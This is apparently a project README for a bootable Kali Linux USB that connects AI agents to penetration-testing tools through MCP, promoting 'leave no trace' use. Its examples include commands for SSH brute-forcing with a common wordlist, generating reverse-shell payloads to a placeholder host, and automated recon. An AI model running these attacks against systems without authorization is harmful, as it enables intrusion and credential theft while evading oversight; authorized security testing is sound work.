# 🗡️ Kali + OpenCode Portable Pentest USB

> **Boot anywhere. Pentest everything. Leave no trace.**

A bootable USB drive combining **Kali Linux Live** with **AI-powered pentesting tools**: OpenCode, CLI Agent, and Kali MCP for portable, automated penetration testing.

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Kali](https://img.shields.io/badge/Kali-2025.1-blue)](https://kali.org)
[![OpenCode](https://img.shields.io/badge/OpenCode-latest-green)](https://opencode.ai)
[![CLI Agent](https://img.shields.io/badge/CLI%20Agent-v1.2.6-orange)](https://github.com/amranu/cli-agent)
[![Kali MCP](https://img.shields.io/badge/Kali%20MCP-35%2B%20tools-red)](https://github.com/k3nn3dy-ai/kali-mcp)

---

## 🔥 Why This Exists

Traditional pentesting workflow problems:

| Problem | This Solution |
|---------|---------------|
| Tools scattered across machines | Single USB, everything pre-configured |
| Manual, repetitive recon workflows | AI tools automate workflows |
| Forgetting to document findings | Auto-documentation and memory files |
| Leaving traces on client systems | Boot Live USB, nothing touches host disk |
| API dependency for AI tools | CLI Agent works offline with Ollama |
| Learning curve for tools | Kali MCP exposes 35+ tools via AI |

---

## 📦 What You Get

- **Full Kali Linux** - Every pentest tool (nmap, metasploit, burp, hashcat, etc.)
- **OpenCode** - Modern AI CLI with MCP support, web UI, and multi-agent coordination
- **CLI Agent** - Lightweight AI agent with local Ollama model support
- **Kali MCP** - 35+ security tools exposed as MCP tools (network scanning, web testing, exploitation, etc.)
- **Persistence** - Your configs, workflows, and findings survive reboots
- **Forensically Clean** - Remove USB, no trace on host (RAM only)

---

## 🤖 AI Tool Suite

### OpenCode (Cloud + Local)

```bash
# Start OpenCode
opencode

# Open web interface
opencode web
```

**Features:** TUI, web interface, MCP protocol, multi-agent, GitHub integration

### CLI Agent (Local-First)

```bash
# Activate environment
source ~/cli-agent/.venv/bin/activate

# Start with cloud API
agent chat

# Start with local Ollama (offline!)
agent chat --model ollama:llama3

# MCP server mode
python mcp_server.py --stdio
```

**Features:** Works offline with Ollama, supports Claude/GPT/DeepSeek/Gemini

### Kali MCP (35+ Security Tools)

```
# Direct tool usage via MCP
/port_scan target=192.168.1.1 scan_type=quick
/dns_enum domain=example.com
/hydra_attack target=10.0.0.1 service=ssh
/payload_generate payload_type=reverse_shell platform=linux lhost=YOUR_IP lport=4444
/recon_auto target=example.com depth=standard
```

**Tool Categories:**
| Category | Tools |
|----------|-------|
| Network Scanning | port_scan, network_discovery, dns_enum |
| Web Testing | web_enumeration, vulnerability_scan, spider_website |
| Exploitation | exploit_search, payload_generate, reverse_shell |
| Credentials | hydra_attack, credential_store, hash_identify |
| Reporting | create_report, save_output, file_analysis |
| Session | session_create, session_list, session_switch |

---

## 🚀 Quick Start

### Build the USB

```bash
git clone https://github.com/Adarsh1Y/kali-opencode-usb.git
cd kali-opencode-usb
sudo ./build-usb.sh /dev/sdX
# Wait 10-20 minutes (downloads ~3GB Kali ISO)
```

### Boot

1. Plug USB into target machine
2. Boot from USB (F12/Del/Esc for boot menu)
3. Select **"Live USB Persistence"**
4. Login: `kali` / `kali`

### First Boot Setup

```bash
sudo bash ~/opencode-setup.sh
```

This installs:
- OpenCode
- CLI Agent
- Kali MCP
- Ollama (optional)

---

## 📁 Repository Structure

```
kali-opencode-usb/
├── build-usb.sh              # USB builder script
├── kali-mcp/                 # Kali MCP Server (35+ tools)
│   ├── kali_mcp_server/      # MCP tools implementation
│   ├── Dockerfile            # Docker container
│   └── README.md             # Kali MCP docs
├── cli-agent/                # CLI Agent (from ~/cli-agent)
├── postinstall/
│   ├── opencode-setup.sh     # First-boot setup
│   └── README-OPENCODE.txt   # Quick reference
├── scripts/
│   ├── backup-config.sh
│   └── deploy-node.sh
└── docs/
    ├── USAGE.md
    └── SECURITY.md
```

---

## 🔧 MCP Configuration

OpenCode is pre-configured with both MCP servers:

```jsonc
// ~/.config/opencode/opencode.jsonc
{
  "mcp": {
    "cli-agent": {
      "type": "local",
      "command": ["~/cli-agent/.venv/bin/python", "~/cli-agent/mcp_server.py"],
      "enabled": true
    },
    "kali-mcp": {
      "type": "local",
      "command": ["~/kali-mcp/.venv/bin/python", "-m", "kali_mcp_server"],
      "enabled": true
    }
  }
}
```

---

## 🛠️ Kali MCP Tools (35+)

### Network Tools
```bash
/port_scan target=192.168.1.1 scan_type=full
/network_discovery target=192.168.1.0/24 discovery_type=comprehensive
/dns_enum domain=example.com record_types=a,mx,ns,txt
/subdomain_enum url=https://example.com
```

### Web Application
```bash
/web_enumeration target=http://example.com enumeration_type=full
/vulnerability_scan target=example.com scan_type=comprehensive
/spider_website url=https://example.com depth=3
/header_analysis url=https://example.com
/ssl_analysis url=https://example.com port=443
```

### Exploitation
```bash
/exploit_search search_term="apache 2.4" search_type=web
/payload_generate payload_type=reverse_shell platform=linux lhost=YOUR_IP lport=4444 format=elf
/reverse_shell lhost=YOUR_IP shell_type=bash lport=4444
```

### Credentials
```bash
/hydra_attack target=192.168.1.1 service=ssh username=admin passlist=/usr/share/wordlists/rockyou.txt
/hash_identify hash_value=5d41402abc4b2a76b9719d911017c592
/encode_decode data="hello" operation=encode format=base64
```

### Session Management
```bash
/session_create session_name="client-audit" description="Q1 audit" target=example.com
/session_list
/session_switch session_name="client-audit"
/session_status
```

### Reporting
```bash
/create_report title="Security Assessment" findings="..." report_type=markdown
/save_output content="..." filename="notes" category="general"
/file_analysis filepath=/path/to/file
```

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    USB Drive                            │
├─────────────────────────────────────────────────────────┤
│  [EFI Boot]  - Kali bootloader                        │
│  [Live ISO]  - Read-only Kali base system             │
│  [Persist]   - /home/kali/                           │
│     ├── .opencode/        - OpenCode config           │
│     ├── .config/opencode/ - MCP servers config        │
│     ├── cli-agent/        - CLI Agent                 │
│     ├── kali-mcp/         - Kali MCP Server           │
│     └── .openclaw/        - Ollama models (optional)   │
└─────────────────────────────────────────────────────────┘
                           │
                           │ Boot on any x64 machine
                           ▼
┌─────────────────────────────────────────────────────────┐
│              Your Portable Pentest Rig                  │
│  • Full Kali toolset                                  │
│  • OpenCode (cloud AI + orchestration)                │
│  • CLI Agent (offline AI with Ollama)                │
│  • Kali MCP (35+ security tools via AI)              │
│  • Nothing touches host disk                         │
└─────────────────────────────────────────────────────────┘
```

---

## 🔐 Security Considerations

> ⚠️ **Only test systems you have written authorization to test.**

- Encrypt persistence partition for sensitive engagements
- Never leave USB unattended
- Use VPN for remote connections
- Document all authorization in memory files

---

## 🙏 Credits

Built with:
- **[Kali Linux](https://kali.org)** - Penetration testing distribution
- **[OpenCode](https://opencode.ai)** - Modern AI CLI
- **[CLI Agent](https://github.com/amranu/cli-agent)** - MCP-enabled AI assistant
- **[Kali MCP](https://github.com/k3nn3dy-ai/kali-mcp)** - 35+ security tools via MCP
- **[Ollama](https://ollama.com)** - Local AI runtime

---

## 📬 Contact

- **GitHub:** [@Adarsh1Y](https://github.com/Adarsh1Y)
- **Discord:** [OpenCode Community](https://discord.gg/opencode)

---

> **Disclaimer:** This tool is for authorized security testing only.
